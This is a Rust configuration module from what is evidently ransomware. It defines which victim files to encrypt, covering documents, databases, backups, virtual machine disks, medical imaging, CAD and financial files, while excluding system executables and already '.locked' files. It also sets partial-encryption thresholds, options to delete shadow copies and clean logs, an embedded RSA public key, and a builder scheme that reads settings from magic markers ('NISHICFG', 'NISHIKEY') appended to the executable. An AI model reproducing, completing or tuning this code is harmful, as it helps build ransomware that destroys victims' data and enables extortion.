// TODO: Configuration loader for `config/crypt.toml`

//! Read configuration file and provide typed Config struct.

// Expected API:
// pub struct Config { pub algorithm: String, pub use_memory_mapping: bool, pub parallel: bool, pub threads: usize, pub extensions: Vec<String>, pub memory_mapped_threshold: usize }
// pub fn load_config(path: Option<&std::path::Path>) -> Config;
use serde::{Deserialize, Serialize};
use serde_json;
use std::collections::HashSet;
use std::fs;
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default = "default_max_worker_threads")]
    pub max_worker_threads: u32,
    #[serde(default = "default_io_threads")]
    pub io_threads: u32,
    #[serde(default = "default_compute_threads")]
    pub compute_threads: u32,
    #[serde(default = "default_memory_pool_size")]
    pub memory_pool_size: usize,
    #[serde(default = "default_async_buffer_size")]
    pub async_buffer_size: usize,
    #[serde(default = "default_enable_gpu_acceleration")]
    pub enable_gpu_acceleration: bool,
    #[serde(default = "default_enable_aesni")]
    pub enable_aesni: bool,
    #[serde(default = "default_enable_memory_pool")]
    pub enable_memory_pool: bool,
    #[serde(default = "default_batch_size")]
    pub batch_size: u32,
    #[serde(default = "default_max_concurrent_io")]
    pub max_concurrent_io: usize,
    #[serde(default = "default_iocp_concurrency")]
    pub iocp_concurrency: u32,
    #[serde(skip)]
    pub header_encrypt_size: u32,
    #[serde(skip)]
    pub chunk_encrypt_ratio: usize,
    #[serde(skip)]
    pub large_file_threshold: usize,
    #[serde(skip)]
    pub small_file_threshold: usize,
    #[serde(default = "default_key_length")]
    pub key_length: usize,
    #[serde(default = "default_iv_length")]
    pub iv_length: usize,
    #[serde(default = "default_tag_length")]
    pub tag_length: usize,
    #[serde(default = "default_memory_mapped_threshold")]
    pub memory_mapped_threshold: usize,
    #[serde(default = "default_enable_async_io")]
    pub enable_async_io: bool,
    #[serde(default = "default_enable_streaming")]
    pub enable_streaming: bool,
    #[serde(default = "default_enable_auto_traverse")]
    pub enable_auto_traverse: bool,
    #[serde(default = "default_enable_full_disk_encryption")]
    pub enable_full_disk_encryption: bool,
    #[serde(default = "default_chunk_size")]
    pub chunk_size: usize,
    #[serde(default = "default_enable_partial_encrypt")]
    pub enable_partial_encrypt: bool,
    #[serde(skip)]
    pub header_percentage: u64,

    #[serde(skip)]
    pub full_encrypt_threshold: u64,
    #[serde(skip)]
    pub medium_encrypt_threshold: u64,
    #[serde(skip)]
    pub large_encrypt_threshold: u64,
    #[serde(skip)]
    pub medium_encrypt_bytes: u64,
    #[serde(skip)]
    pub large_encrypt_bytes: u64,

    #[serde(default = "default_mmap_memory_ratio")]
    pub mmap_memory_ratio: usize,
    #[serde(default = "default_mmap_min_chunk_size")]
    pub mmap_min_chunk_size: usize,
    #[serde(default = "default_mmap_max_chunk_size")]
    pub mmap_max_chunk_size: usize,

    #[serde(default = "default_extensions")]
    pub extensions: Vec<String>,

    #[serde(default = "default_use_blacklist_mode")]
    pub use_blacklist_mode: bool,
    #[serde(default = "default_exclude_extensions")]
    pub exclude_extensions: Vec<String>,

    pub priority_path: Option<String>,
    pub only_encrypt_path: Option<String>,
    #[serde(default = "default_enable_console_output")]
    pub enable_console_output: bool,
    #[serde(default = "default_full_mode")]
    pub full_mode: bool,
    #[serde(default = "default_enable_log_cleanup")]
    pub enable_log_cleanup: bool,

    #[serde(skip)]
    extensions_set: HashSet<String>,
    #[serde(skip)]
    exclude_extensions_set: HashSet<String>,

    #[serde(default = "default_rsa_public_key_base64")]
    pub rsa_public_key_base64: String,
    #[serde(default = "default_default_full_mode")]
    pub default_full_mode: bool,
    #[serde(default = "default_default_network_only")]
    pub default_network_only: bool,
    #[serde(default = "default_default_delete_shadows")]
    pub default_delete_shadows: bool,

    #[serde(default = "default_template_config_offset")]
    pub template_config_offset: usize,
    #[serde(default = "default_template_key_offset")]
    pub template_key_offset: usize,
    #[serde(default = "default_template_config_size")]
    pub template_config_size: usize,
    #[serde(default = "default_template_key_size")]
    pub template_key_size: usize,

    #[serde(default = "default_target_identifier")]
    pub target_identifier: String,
    #[serde(default = "default_encrypt_ratio")]
    pub encrypt_ratio: u64,
    #[serde(default = "default_priority_folders")]
    pub priority_folders: Vec<String>,
}

impl Config {
    pub fn get_extensions_set(&self) -> &HashSet<String> {
        &self.extensions_set
    }

    pub fn get_exclude_extensions_set(&self) -> &HashSet<String> {
        &self.exclude_extensions_set
    }

    pub fn build_extensions_set(extensions: &[String]) -> HashSet<String> {
        extensions.iter().cloned().collect()
    }

    pub fn build_exclude_extensions_set(exclude_extensions: &[String]) -> HashSet<String> {
        exclude_extensions.iter().cloned().collect()
    }

    pub fn with_extensions(mut self, extensions: Vec<String>) -> Self {
        self.extensions = extensions.clone();
        self.extensions_set = Config::build_extensions_set(&extensions);
        self
    }

    pub fn with_exclude_extensions(mut self, exclude_extensions: Vec<String>) -> Self {
        self.exclude_extensions = exclude_extensions.clone();
        self.exclude_extensions_set = Config::build_exclude_extensions_set(&exclude_extensions);
        self
    }

    pub fn new_with_extensions(extensions: Vec<String>) -> Self {
        let mut config = Config::default();
        config.extensions = extensions.clone();
        config.extensions_set = Config::build_extensions_set(&extensions);
        config
    }

    pub fn should_encrypt_file(&self, extension: &str) -> bool {
        if self.use_blacklist_mode {
            !self
                .exclude_extensions_set
                .contains(&extension.to_lowercase())
        } else {
            self.extensions_set.contains(&extension.to_lowercase())
        }
    }
}

impl Default for Config {
    fn default() -> Self {
        let num_cores = std::thread::available_parallelism()
            .map(|n| n.get())
            .unwrap_or(4);

        Config {
            max_worker_threads: (num_cores * 6) as u32, // CPU核心数*6，充分利用但不过载
            io_threads: (num_cores * 2) as u32,         // IO线程数=核心数*2
            compute_threads: (num_cores * 3) as u32,    // 计算线程数=核心数*3，避免128个线程过载
            memory_pool_size: 1024 * 1024 * 64,         // 内存池64MB，避免占死内存
            async_buffer_size: 1024 * 1024 * 4,         // 异步缓冲4MB，快速响应
            enable_gpu_acceleration: false,
            enable_aesni: true,
            enable_memory_pool: true,
            batch_size: 64,
            max_concurrent_io: num_cores * 8,
            iocp_concurrency: num_cores as u32,
            header_encrypt_size: 8192,
            chunk_encrypt_ratio: 4,
            large_file_threshold: 64 * 1024 * 1024,
            small_file_threshold: 1024 * 1024,
            key_length: 16,
            iv_length: 12,
            tag_length: 16,
            memory_mapped_threshold: 16 * 1024 * 1024,
            enable_async_io: true,
            enable_streaming: true,
            enable_auto_traverse: true,
            enable_full_disk_encryption: true,
            chunk_size: 4 * 1024 * 1024,
            enable_partial_encrypt: true,
            header_percentage: 1,

            full_encrypt_threshold: 50 * 1024,
            medium_encrypt_threshold: 400 * 1024,
            large_encrypt_threshold: 2000 * 1024 * 1024,
            medium_encrypt_bytes: 4 * 1024,
            large_encrypt_bytes: 20 * 1024 * 1024,

            mmap_memory_ratio: 5,
            mmap_min_chunk_size: 16 * 1024 * 1024,
            mmap_max_chunk_size: 128 * 1024 * 1024,

            extensions: vec![
                // documents
                "doc".into(),
                "docx".into(),
                "xlsx".into(),
                "xls".into(),
                "pptx".into(),
                "ppt".into(),
                "pdf".into(),
                // databases
                "mdf".into(),
                "ndf".into(),
                "ldf".into(),
                "bak".into(),
                "dbf".into(),
                "db".into(),
                "sqlite".into(),
                "sqlite3".into(),
                "accdb".into(),
                "mdb".into(),
                "frm".into(),
                "ibd".into(),
                "myi".into(),
                "myd".into(),
                "ora".into(),
                "dmp".into(),
                "backup".into(),
                "wal".into(),
                "journal".into(),
                "dat".into(),
                "bin".into(),
                // financial files
                "qbb".into(),
                "qbo".into(),
                "ofx".into(),
                // source code/script files
                "javass".into(),
                "pys".into(),
                "jss".into(),
                "ymls".into(),
                "inis".into(),
                "envs".into(),
                // design files
                "psd".into(),
                "ai".into(),
                "dwg".into(),
                "skp".into(),
                // virtualization/backup files
                "vmdk".into(),
                "iso".into(),
                "pfx".into(),
                "pems".into(),
                // 添加更多虚拟机文件扩展名
                "vhd".into(),
                "vhdx".into(),
                "vmx".into(),
                "vmxf".into(),
                "vdi".into(),
                "hdd".into(),
                "ovf".into(),
                "ova".into(),
                // email files
                "pst".into(),
                "mbox".into(),
                "mpp".into(),
                // archive files
                "jar".into(),
                "zip".into(),
                "tar.gz".into(),
                // image files
                "jpg".into(),
                "png".into(),
                "txtx".into(),
                "jpeg".into(),
                // audio files
                "mp3".into(),
                "wav".into(),
                "flac".into(),
                "aac".into(),
                "ogg".into(),
                "wma".into(),
                "m4a".into(),
                "aiff".into(),
                "au".into(),
                "ra".into(),
                "ac3".into(),
                "dts".into(),
                "amr".into(),
                "3gp".into(),
                "m4r".into(),
                "opus".into(),
                "mid".into(),
                "midi".into(),
                // video files
                "mp4".into(),
                "avi".into(),
                "mkv".into(),
                "mov".into(),
                "wmv".into(),
                "flv".into(),
                "webm".into(),
                "m4v".into(),
                "3g2".into(),
                "rm".into(),
                "rmvb".into(),
                "asf".into(),
                "mpg".into(),
                "mpeg".into(),
                "mpe".into(),
                "ts".into(),
                "mts".into(),
                "m2ts".into(),
                "vob".into(),
                "divx".into(),
                "xvid".into(),
                "f4v".into(),
                "swf".into(),
                // CAD/design files
                "dxf".into(),
                "dgn".into(),
                "stl".into(),
                "step".into(),
                "stp".into(),
                "iges".into(),
                "igs".into(),
                "ipt".into(),
                "iam".into(),
                "prt".into(),
                "asm".into(),
                "catpart".into(),
                "catproduct".into(),
                "sldprt".into(),
                "sldasm".into(),
                "slddrw".into(),
                "3ds".into(),
                "max".into(),
                "obj".into(),
                "fbx".into(),
                "blend".into(),
                "mb".into(),
                "ma".into(),
                "c4d".into(),
                "ztl".into(),
                "3dm".into(),
                "rhino".into(),
                // medical files
                "dicom".into(),
                "dcm".into(),
                "nii".into(),
                "nii.gz".into(),
                "mgh".into(),
                "mgz".into(),
                "img".into(),
                "hdr".into(),
                "ima".into(),
                "vox".into(),
                "analyze".into(),
                "mnc".into(),
                "mosaic".into(),
                "pic".into(),
                "bshort".into(),
                "bfloat".into(),
                "spr".into(),
                "eeg".into(),
                "edf".into(),
                "bdf".into(),
                "fif".into(),
                "set".into(),
                "cnt".into(),
                "vmrk".into(),
                "vhdr".into(),
                "ecg".into(),
                "emg".into(),
                "xry".into(),
                "ct".into(),
                "mri".into(),
                "pet".into(),
                "spect".into(),
                // industrial/manufacturing files
                "nc".into(),
                "cnc".into(),
                "gcode".into(),
                "tap".into(),
                "apt".into(),
                "cl".into(),
                "plt".into(),
                "hpgl".into(),
                "hp".into(),
                "cam".into(),
                "prg".into(),
                "mpf".into(),
                "mmg".into(),
                "dmis".into(),
                "cmm".into(),
                "xyz".into(),
                "pointcloud".into(),
                "pcd".into(),
                "las".into(),
                "laz".into(),
                "3d".into(),
                "asc".into(),
                "pts".into(),
                "ptx".into(),
                "e57".into(),
                "fls".into(),
                "sdc".into(),
                "rpc".into(),
                "rpl".into(),
                "rpl2".into(),
                "rpl3".into(),
                "rpl4".into(),
                "rpl5".into(),
                "rpl6".into(),
                // engineering/manufacturing files
                "plm".into(),
                "plmx".into(),
                "prt".into(),
                "asm".into(),
                "drw".into(),
                "frm".into(),
                "lay".into(),
                "idw".into(),
                "ipj".into(),
                "iam".into(),
                "ipt".into(),
                "neu".into(),
                "unv".into(),
                "cdb".into(),
                "rst".into(),
                "rth".into(),
                "full".into(),
                "dat".into(),
                "inp".into(),
                "mac".into(),
                "ses".into(),
                "cax".into(),
                "model".into(),
                // BIM/architecture files
                "rvt".into(),
                "rfa".into(),
                "rte".into(),
                "adsk".into(),
                "ifc".into(),
                "ifczip".into(),
                "dgn".into(),
                "dwg".into(),
                "plt".into(),
                "ctb".into(),
                "stb".into(),
                "pc3".into(),
                "pm3".into(),
                "dst".into(),
                "dsz".into(),
                // scientific data files
                "fits".into(),
                "fit".into(),
                "sdf".into(),
                "mol".into(),
                "mol2".into(),
                "pdb".into(),
                "cif".into(),
                "ent".into(),
                "xyz".into(),
                "log".into(),
                "com".into(),
                "gjf".into(),
                "inp".into(),
                "out".into(),
                "chk".into(),
                "fchk".into(),
                "wfn".into(),
                "wfx".into(),
                // compressed files
                "7z".into(),
                "rar".into(),
                "zip".into(),
            ],

            priority_path: None,
            only_encrypt_path: None,
            enable_console_output: true,
            full_mode: false,
            enable_log_cleanup: true,
            extensions_set: Config::build_extensions_set(&vec![
                "doc".into(),
                "docx".into(),
                "xlsx".into(),
                "xls".into(),
                "pptx".into(),
                "ppt".into(),
                "pdf".into(),
                "mdf".into(),
                "ndf".into(),
                "ldf".into(),
                "bak".into(),
                "dbf".into(),
                "db".into(),
                "sqlite".into(),
                "sqlite3".into(),
                "accdb".into(),
                "mdb".into(),
                "frm".into(),
                "ibd".into(),
                "myi".into(),
                "myd".into(),
                "ora".into(),
                "dmp".into(),
                "backup".into(),
                "wal".into(),
                "journal".into(),
                "dat".into(),
                "bin".into(),
                "qbb".into(),
                "qbo".into(),
                "ofx".into(),
                "javass".into(),
                "pys".into(),
                "jss".into(),
                "ymls".into(),
                "inis".into(),
                "envs".into(),
                "psd".into(),
                "ai".into(),
                "dwg".into(),
                "skp".into(),
                "vmdk".into(),
                "iso".into(),
                "pfx".into(),
                "pems".into(),
                "vhd".into(),
                "vhdx".into(),
                "vmx".into(),
                "vmxf".into(),
                "vdi".into(),
                "hdd".into(),
                "ovf".into(),
                "ova".into(),
                "pst".into(),
                "mbox".into(),
                "mpp".into(),
                "jar".into(),
                "zip".into(),
                "tar.gz".into(),
                "jpg".into(),
                "png".into(),
                "txtx".into(),
                "jpeg".into(),
                // CAD/design files
                "dxf".into(),
                "dgn".into(),
                "stl".into(),
                "step".into(),
                "stp".into(),
                "iges".into(),
                "igs".into(),
                "ipt".into(),
                "iam".into(),
                "prt".into(),
                "asm".into(),
                "catpart".into(),
                "catproduct".into(),
                "sldprt".into(),
                "sldasm".into(),
                "slddrw".into(),
                "3ds".into(),
                "max".into(),
                "obj".into(),
                "fbx".into(),
                "blend".into(),
                "mb".into(),
                "ma".into(),
                "c4d".into(),
                "ztl".into(),
                "3dm".into(),
                "rhino".into(),
                "dicom".into(),
                "dcm".into(),
                "nii".into(),
                "nii.gz".into(),
                "mgh".into(),
                "mgz".into(),
                "img".into(),
                "hdr".into(),
                "ima".into(),
                "vox".into(),
                "analyze".into(),
                "mnc".into(),
                "mosaic".into(),
                "pic".into(),
                "bshort".into(),
                "bfloat".into(),
                "spr".into(),
                "eeg".into(),
                "edf".into(),
                "bdf".into(),
                "fif".into(),
                "set".into(),
                "cnt".into(),
                "vmrk".into(),
                "vhdr".into(),
                "ecg".into(),
                "emg".into(),
                "xry".into(),
                "ct".into(),
                "mri".into(),
                "pet".into(),
                "spect".into(),
                "nc".into(),
                "cnc".into(),
                "gcode".into(),
                "tap".into(),
                "apt".into(),
                "cl".into(),
                "plt".into(),
                "hpgl".into(),
                "hp".into(),
                "cam".into(),
                "prg".into(),
                "mpf".into(),
                "mmg".into(),
                "dmis".into(),
                "cmm".into(),
                "xyz".into(),
                "pointcloud".into(),
                "pcd".into(),
                "las".into(),
                "laz".into(),
                "3d".into(),
                "asc".into(),
                "pts".into(),
                "ptx".into(),
                "e57".into(),
                "fls".into(),
                "sdc".into(),
                "rpc".into(),
                "rpl".into(),
                "rpl2".into(),
                "rpl3".into(),
                "rpl4".into(),
                "rpl5".into(),
                "rpl6".into(),
                "plm".into(),
                "plmx".into(),
                "prt".into(),
                "asm".into(),
                "drw".into(),
                "frm".into(),
                "lay".into(),
                "idw".into(),
                "ipj".into(),
                "iam".into(),
                "ipt".into(),
                "neu".into(),
                "unv".into(),
                "cdb".into(),
                "rst".into(),
                "rth".into(),
                "full".into(),
                "dat".into(),
                "inp".into(),
                "mac".into(),
                "ses".into(),
                "cax".into(),
                "model".into(),
                "rvt".into(),
                "rfa".into(),
                "rte".into(),
                "adsk".into(),
                "ifc".into(),
                "ifczip".into(),
                "dgn".into(),
                "dwg".into(),
                "plt".into(),
                "ctb".into(),
                "stb".into(),
                "pc3".into(),
                "pm3".into(),
                "dst".into(),
                "dsz".into(),
                "fits".into(),
                "fit".into(),
                "sdf".into(),
                "mol".into(),
                "mol2".into(),
                "pdb".into(),
                "cif".into(),
                "ent".into(),
                "xyz".into(),
                "log".into(),
                "com".into(),
                "gjf".into(),
                "inp".into(),
                "out".into(),
                "chk".into(),
                "fchk".into(),
                "wfn".into(),
                "wfx".into(),
                "7z".into(),
                "rar".into(),
                "zip".into(),
            ]),

            rsa_public_key_base64: String::new(),
            default_full_mode: false,
            default_network_only: false,
            default_delete_shadows: false,

            use_blacklist_mode: true,
            exclude_extensions: vec![
                "exe".into(),
                "dll".into(),
                "sys".into(),
                "bat".into(),
                "cmd".into(),
                "ps1".into(),
                "vbs".into(),
                "js".into(),
                "jar".into(),
                "com".into(),
                "scr".into(),
                "pif".into(),
                "app".into(),
                "deb".into(),
                "rpm".into(),
                "dmg".into(),
                "pkg".into(),
                "msi".into(),
                "iso".into(),
                "img".into(),
                "vmdk".into(),
                "vhd".into(),
                "vhdx".into(),
                "vdi".into(),
                "lnk".into(),
                "url".into(),
                "website".into(),
                "trae".into(),
                "powershell".into(),
            ],
            exclude_extensions_set: Config::build_exclude_extensions_set(&vec![
                "exe".into(),
                "dll".into(),
                "sys".into(),
                "bat".into(),
                "cmd".into(),
                "ps1".into(),
                "vbs".into(),
                "js".into(),
                "jar".into(),
                "com".into(),
                "scr".into(),
                "pif".into(),
                "app".into(),
                "deb".into(),
                "rpm".into(),
                "dmg".into(),
                "pkg".into(),
                "msi".into(),
                "iso".into(),
                "img".into(),
                "vmdk".into(),
                "vhd".into(),
                "vhdx".into(),
                "vdi".into(),
                "lnk".into(),
                "url".into(),
                "website".into(),
                "trae".into(),
                "powershell".into(),
            ]),

            template_config_offset: 0,
            template_key_offset: 0,
            template_config_size: 8192,
            template_key_size: 8192,

            target_identifier: String::new(),
            encrypt_ratio: 100,
            priority_folders: vec![],
        }
    }
}

impl Config {
    pub fn auto_tune_performance(&mut self) {
        let num_cores = std::thread::available_parallelism()
            .map(|n| n.get())
            .unwrap_or(4);

        let available_memory = self.get_available_memory();
        let memory_pool_size = (available_memory * 80 / 100) as usize;
        let async_buffer_size = (available_memory * 10 / 100) as usize;

        self.max_worker_threads = (num_cores * 6) as u32;
        self.io_threads = (num_cores * 2) as u32;
        self.compute_threads = (num_cores * 3) as u32;
        self.max_concurrent_io = num_cores * 8;
        self.iocp_concurrency = num_cores as u32;

        self.memory_pool_size = memory_pool_size.max(1024 * 1024 * 64);
        self.async_buffer_size = async_buffer_size.max(1024 * 1024 * 4);

        println!(
            "[AUTO-TUNE] Performance parameters tuned for {} CPU cores, {}MB available memory:",
            num_cores,
            available_memory / 1024 / 1024
        );
        println!(
            "[AUTO-TUNE]   max_worker_threads: {}",
            self.max_worker_threads
        );
        println!("[AUTO-TUNE]   io_threads: {}", self.io_threads);
        println!("[AUTO-TUNE]   compute_threads: {}", self.compute_threads);
        println!(
            "[AUTO-TUNE]   max_concurrent_io: {}",
            self.max_concurrent_io
        );
        println!("[AUTO-TUNE]   iocp_concurrency: {}", self.iocp_concurrency);
        println!(
            "[AUTO-TUNE]   memory_pool_size: {}MB (80% of available memory)",
            self.memory_pool_size / 1024 / 1024
        );
        println!(
            "[AUTO-TUNE]   async_buffer_size: {}MB (10% of available memory)",
            self.async_buffer_size / 1024 / 1024
        );
    }

    fn get_available_memory(&self) -> u64 {
        #[cfg(target_os = "windows")]
        {
            use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

            let mut status: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
            status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;

            if unsafe { GlobalMemoryStatusEx(&mut status) } != 0 {
                return status.ullAvailPhys;
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            let mut sys = sysinfo::System::new_all();
            sys.refresh_memory();
            return sys.available_memory();
        }

        1024 * 1024 * 1024
    }

    pub fn load_from_file<P: AsRef<Path>>(path: P) -> Result<Self, Box<dyn std::error::Error>> {
        let content = fs::read_to_string(path)?;
        let config: Config = toml::from_str(&content)?;
        Ok(config)
    }

    pub fn save_to_file<P: AsRef<Path>>(&self, path: P) -> Result<(), Box<dyn std::error::Error>> {
        let content = toml::to_string_pretty(self)?;
        fs::write(path, content)?;
        Ok(())
    }

    pub fn load_from_binary() -> Result<Self, Box<dyn std::error::Error>> {
        eprintln!("DEBUG: [Config::load_from_binary] Starting...");

        let exe_path = std::env::current_exe()?;
        eprintln!(
            "DEBUG: [Config::load_from_binary] exe_path = {:?}",
            exe_path
        );
        eprintln!(
            "DEBUG: [Config::load_from_binary] File size: {} bytes",
            exe_path.metadata()?.len()
        );

        let binary_data = fs::read(&exe_path)?;
        eprintln!(
            "DEBUG: [Config::load_from_binary] binary_data length: {} bytes",
            binary_data.len()
        );

        let template_size = binary_data.len();
        let config_size = 8192;
        let key_size = 8192;

        const CONFIG_MAGIC: &[u8; 8] = b"NISHICFG";
        const KEY_MAGIC: &[u8; 8] = b"NISHIKEY";

        eprintln!("DEBUG: Searching for CONFIG_MAGIC marker...");
        let config_magic_pos = binary_data
            .windows(CONFIG_MAGIC.len())
            .position(|window| window == CONFIG_MAGIC);

        eprintln!("DEBUG: Searching for KEY_MAGIC marker...");
        let key_magic_pos = binary_data
            .windows(KEY_MAGIC.len())
            .position(|window| window == KEY_MAGIC);

        let (config_offset, key_offset) = if let (Some(cfg_pos), Some(key_pos)) = (config_magic_pos, key_magic_pos) {
            eprintln!("DEBUG: Found CONFIG_MAGIC at position: {}", cfg_pos);
            eprintln!("DEBUG: Found KEY_MAGIC at position: {}", key_pos);
            
            let available_space = key_pos - cfg_pos - CONFIG_MAGIC.len();
            eprintln!("DEBUG: Available space between markers: {} bytes", available_space);
            
            if available_space >= config_size {
                (cfg_pos + CONFIG_MAGIC.len(), key_pos + KEY_MAGIC.len())
            } else {
                eprintln!("DEBUG: Magic markers found but space too small ({} < {}), using file end", available_space, config_size);
                let cfg_off = if template_size > config_size + key_size {
                    template_size - config_size - key_size
                } else {
                    0
                };
                let key_off = if template_size > key_size {
                    template_size - key_size
                } else {
                    0
                };
                (cfg_off, key_off)
            }
        } else {
            eprintln!("DEBUG: Magic markers not found, falling back to offset calculation");
            let cfg_off = if template_size > config_size + key_size {
                template_size - config_size - key_size
            } else {
                0
            };
            let key_off = if template_size > key_size {
                template_size - key_size
            } else {
                0
            };
            (cfg_off, key_off)
        };

        eprintln!(
            "DEBUG: [Config::load_from_binary] Template size: {} bytes",
            template_size
        );
        eprintln!(
            "DEBUG: [Config::load_from_binary] Config offset: {} bytes",
            config_offset
        );
        eprintln!(
            "DEBUG: [Config::load_from_binary] Key offset: {} bytes",
            key_offset
        );

        if config_offset >= template_size || key_offset >= template_size {
            eprintln!("DEBUG: [Config::load_from_binary] Invalid offsets, using default config");
            return Ok(Config::default());
        }

        let config_data = &binary_data[config_offset..key_offset];
        
        let config_data_trimmed = if let Some(null_pos) = config_data.iter().position(|&b| b == 0) {
            &config_data[..null_pos]
        } else {
            config_data
        };
        
        let config_str = std::str::from_utf8(config_data_trimmed)?
            .trim();

        eprintln!("DEBUG: Config data length: {} bytes", config_data.len());
        eprintln!("DEBUG: Config data trimmed length: {} bytes", config_data_trimmed.len());
        eprintln!("DEBUG: Config string length: {} chars", config_str.len());
        eprintln!("DEBUG: Config string is_empty: {}", config_str.is_empty());

        if config_str.is_empty() {
            eprintln!("DEBUG: Config string is empty, using default config");
            return Ok(Config::default());
        }

        eprintln!(
            "DEBUG: Config string (first 500 chars): {}",
            &config_str[..config_str.len().min(500)]
        );

        let mut config: Config = serde_json::from_str(config_str).map_err(|e| {
            eprintln!("DEBUG: Failed to parse config JSON: {}", e);
            eprintln!(
                "DEBUG: Config string (first 500 chars): {}",
                &config_str[..config_str.len().min(500)]
            );
            e
        })?;

        config.template_config_offset = config_offset;
        config.template_key_offset = key_offset;
        config.template_config_size = config_size;
        config.template_key_size = key_size;

        Ok(config)
    }

    pub fn get_rsa_public_key_from_binary() -> Result<String, Box<dyn std::error::Error>> {
        let exe_path = std::env::current_exe()?;
        let binary_data = fs::read(&exe_path)?;

        const KEY_MAGIC: &[u8; 8] = b"NISHIKEY";

        eprintln!("Searching for KEY_MAGIC marker in binary...");
        let key_magic_pos = binary_data
            .windows(KEY_MAGIC.len())
            .position(|window| window == KEY_MAGIC);

        let key_offset = if let Some(pos) = key_magic_pos {
            eprintln!("Found KEY_MAGIC at position: {}", pos);
            pos + KEY_MAGIC.len()
        } else {
            eprintln!("KEY_MAGIC not found, falling back to offset calculation");
            let template_size = binary_data.len();
            let key_size = 8192;
            template_size - key_size
        };

        let key_data = &binary_data[key_offset..];

        let key_str = match std::str::from_utf8(key_data) {
            Ok(s) => s.trim_end_matches('\0').trim().to_string(),
            Err(e) => {
                eprintln!("Warning: RSA public key has UTF-8 issue: {}", e);
                eprintln!("Attempting to extract valid UTF-8 portion...");

                let null_pos = key_data
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(key_data.len());
                let valid_data = &key_data[..null_pos];

                match std::str::from_utf8(valid_data) {
                    Ok(s) => s.trim().to_string(),
                    Err(_) => {
                        eprintln!("Attempting to filter non-ASCII characters...");
                        let cleaned: String = valid_data
                            .iter()
                            .filter(|&&b| b.is_ascii())
                            .map(|&b| b as char)
                            .collect();
                        cleaned.trim().to_string()
                    }
                }
            }
        };

        if key_str.is_empty() {
            return Ok(String::new());
        }

        Ok(key_str.to_string())
    }
}

fn default_max_worker_threads() -> u32 {
    let num_cores = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);
    (num_cores * 6) as u32
}

fn default_io_threads() -> u32 {
    let num_cores = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);
    (num_cores * 2) as u32
}

fn default_compute_threads() -> u32 {
    let num_cores = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);
    (num_cores * 3) as u32
}

fn default_memory_pool_size() -> usize {
    1024 * 1024 * 64
}

fn default_async_buffer_size() -> usize {
    1024 * 1024 * 4
}

fn default_enable_gpu_acceleration() -> bool {
    false
}

fn default_enable_aesni() -> bool {
    true
}

fn default_enable_memory_pool() -> bool {
    true
}

fn default_batch_size() -> u32 {
    64
}

fn default_max_concurrent_io() -> usize {
    let num_cores = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);
    num_cores * 8
}

fn default_iocp_concurrency() -> u32 {
    let num_cores = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4);
    num_cores as u32
}

fn default_key_length() -> usize {
    16
}

fn default_iv_length() -> usize {
    12
}

fn default_tag_length() -> usize {
    16
}

fn default_memory_mapped_threshold() -> usize {
    16 * 1024 * 1024
}

fn default_enable_async_io() -> bool {
    true
}

fn default_enable_streaming() -> bool {
    true
}

fn default_enable_auto_traverse() -> bool {
    true
}

fn default_enable_full_disk_encryption() -> bool {
    true
}

fn default_chunk_size() -> usize {
    4 * 1024 * 1024
}

fn default_enable_partial_encrypt() -> bool {
    true
}

fn default_mmap_memory_ratio() -> usize {
    10
}

fn default_mmap_min_chunk_size() -> usize {
    64 * 1024 * 1024
}

fn default_mmap_max_chunk_size() -> usize {
    2048 * 1024 * 1024
}

fn default_extensions() -> Vec<String> {
    vec![]
}

fn default_use_blacklist_mode() -> bool {
    true
}

fn default_exclude_extensions() -> Vec<String> {
    vec![
        "exe".to_string(),
        "dll".to_string(),
        "sys".to_string(),
        "rs".to_string(),
        "toml".to_string(),
        "regtrans-ms".to_string(),
        "blf".to_string(),
        "locked".to_string(),
    ]
}

fn default_enable_console_output() -> bool {
    true
}

fn default_full_mode() -> bool {
    true
}

fn default_enable_log_cleanup() -> bool {
    true
}

fn default_rsa_public_key_base64() -> String {
    String::new()
}

fn default_default_full_mode() -> bool {
    true
}

fn default_default_network_only() -> bool {
    false
}

fn default_default_delete_shadows() -> bool {
    false
}

fn default_template_config_offset() -> usize {
    0
}

fn default_template_key_offset() -> usize {
    0
}

fn default_template_config_size() -> usize {
    8192
}

fn default_template_key_size() -> usize {
    8192
}

fn default_target_identifier() -> String {
    String::new()
}

fn default_encrypt_ratio() -> u64 {
    100
}

fn default_priority_folders() -> Vec<String> {
    vec![]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let config = Config::default();
        assert!(config.max_worker_threads > 0);
        assert_eq!(config.key_length, 16);
        assert_eq!(config.iv_length, 12);
    }

    #[test]
    fn test_config_serialization() {
        let config = Config::default();
        let serialized = toml::to_string(&config).unwrap();
        let deserialized: Config = toml::from_str(&serialized).unwrap();
        assert_eq!(config.key_length, deserialized.key_length);
    }
}
